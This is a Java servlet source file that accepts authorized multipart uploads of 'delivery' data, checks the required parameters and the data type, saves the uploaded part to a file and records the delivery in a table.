package com.theah64.xrob.api.servlets;

import com.theah64.xrob.api.database.tables.Deliveries;
import com.theah64.xrob.api.models.Delivery;
import com.theah64.xrob.api.utils.HeaderSecurity;
import com.theah64.xrob.api.utils.JSONUtils;
import com.theah64.xrob.api.utils.Request;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;
import java.io.*;

/**
 * Created by theapache64 on 11/18/2015.
 */

@WebServlet(urlPatterns = {"/upload"})
@MultipartConfig
public class FileUploadServlet extends BaseServlet {

    private static final String[] requiredParams = {
            KEY_ERROR, // To track if the delivery has any error
            KEY_MESSAGE //To explain about the success or error
    };

    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        setGETMethodNotSupported(resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        resp.setContentType(CONTENT_TYPE_JSON);

        //Out
        final PrintWriter out = resp.getWriter();

        final HeaderSecurity headerSecurity = new HeaderSecurity(req.getHeader(HeaderSecurity.KEY_AUTHORIZATION));

        if (headerSecurity.isAuthorized()) {

            //Building request
            final Request request = new Request(req, requiredParams);

            if (request.hasAllParams()) {

                final boolean hasError = request.getBooleanParameter(KEY_ERROR);
                final String message = request.getStringParameter(KEY_MESSAGE);

                //Has all needed params, so add it to deliveries
                final Delivery newDelivery = new Delivery(headerSecurity.getUserId(), hasError, message);

                if (!hasError) {

                    //No errors found
                    if (request.has(KEY_DATA_TYPE)) {

                        final String dataType = request.getStringParameter(KEY_DATA_TYPE);

                        if (Delivery.isValidType(dataType)) {

                            //Setting data type of delivery
                            newDelivery.setDataType(dataType);

                            //Yes,it's a valid data type
                            final Part dataFilePart = req.getPart(KEY_DATA);

                            if (dataFilePart != null) {

                                System.out.println("Saving file...");

                                final String fileName = dataFilePart.getName();
                                final String contentType = dataFilePart.getContentType();
                                final long size = dataFilePart.getSize();

                                System.out.println(String.format("Name : %s\nContentType:%s\nSize: %d", fileName, contentType, size));
                                System.out.println(size);

                                final FileOutputStream fos = new FileOutputStream(fileName);
                                final InputStream is = dataFilePart.getInputStream();
                                byte[] buffer = new byte[1024];
                                int read = 0;
                                while ((read = is.read(buffer)) != -1) {
                                    fos.write(buffer, 0, read);
                                }
                                fos.flush();
                                fos.close();
                                is.close();

                            } else {
                                //ERROR: No file found
                                out.write(
                                        JSONUtils.getErrorJSON(
                                                String.format("%s file is missing", KEY_DATA)
                                        )
                                );
                            }

                            //TODO: Check if the file has some valid data
                            //TODO: Save the file if it's binary or the data in database if it's text.


                        } else {
                            //Invalid data type
                            out.write(
                                    JSONUtils.getErrorJSON(
                                            String.format("Invalid data type %s", dataType)
                                    )
                            );
                        }

                        //What ever the data_type, adding delivery;
                        Deliveries.getInstance().add(newDelivery);

                    } else {
                        //DATA or DATA_TYPE is missing or invalid
                        out.write(
                                JSONUtils.getErrorJSON(
                                        String.format("%s is missing or invalid", KEY_DATA_TYPE)
                                )
                        );
                    }

                } else {
                    //Has error
                    out.write(
                            request.getStringParameter(KEY_MESSAGE)
                    );
                }

            } else {
                //Requered params missing or invalid
                out.write(
                        JSONUtils.getErrorJSON(
                                request.getErrorReport()
                        )
                );
            }

        } else {
            //Failed to authorize the request
            out.write(
                    JSONUtils.getErrorJSON(
                            headerSecurity.getFailureReason()
                    )
            );
        }


        out.flush();
        out.close();

    }

}
